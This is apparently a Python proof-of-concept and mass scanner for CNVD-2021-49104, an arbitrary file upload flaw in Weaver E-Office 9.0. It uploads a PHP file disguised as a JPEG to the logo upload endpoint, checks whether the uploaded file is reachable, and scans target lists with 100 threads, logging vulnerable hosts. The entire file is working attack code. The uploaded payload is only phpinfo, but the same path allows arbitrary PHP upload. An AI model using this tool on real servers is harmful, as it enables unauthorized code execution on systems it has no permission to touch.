# 泛微Weaver E-Office9.0文件上传 CNVD-2021-49104
# 这个漏洞智能通过访问/images/logo/logo-eoffice.php  判断是否传上去，exp无法下手
import requests
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    parser = argparse.ArgumentParser(description="泛微Weaver E-Office9.0文件上传")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    files = {
        'Filedata': ('test.php', '<?php phpinfo();?>', 'image/jpeg')
    }
    try:
        res = requests.get(url=target, verify=False, timeout=10)
        if res.status_code == 200:
            response = requests.post(url=url, headers=headers, files=files, verify=False, timeout=10,proxies=proxies)
            if response.status_code == 200:
                res1=requests.get(url=target+"/images/logo/logo-eoffice.php",verify=False, timeout=10)
                if res1.status_code==200:
                    print(f"[+] 该网址存在信息泄露漏洞 {target}")
                    with open('result.txt', 'a') as f:
                        f.write(target + '\n')
                        # return True
                else:
                    print(f"[-]该网址访问不到/logo-eoffice.php界面{target}")
            else:
                print(f"[-] 该网址不存在信息泄露漏洞 {target}")
        else:
            print(f"[*] 无法访问目标 {target}")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()
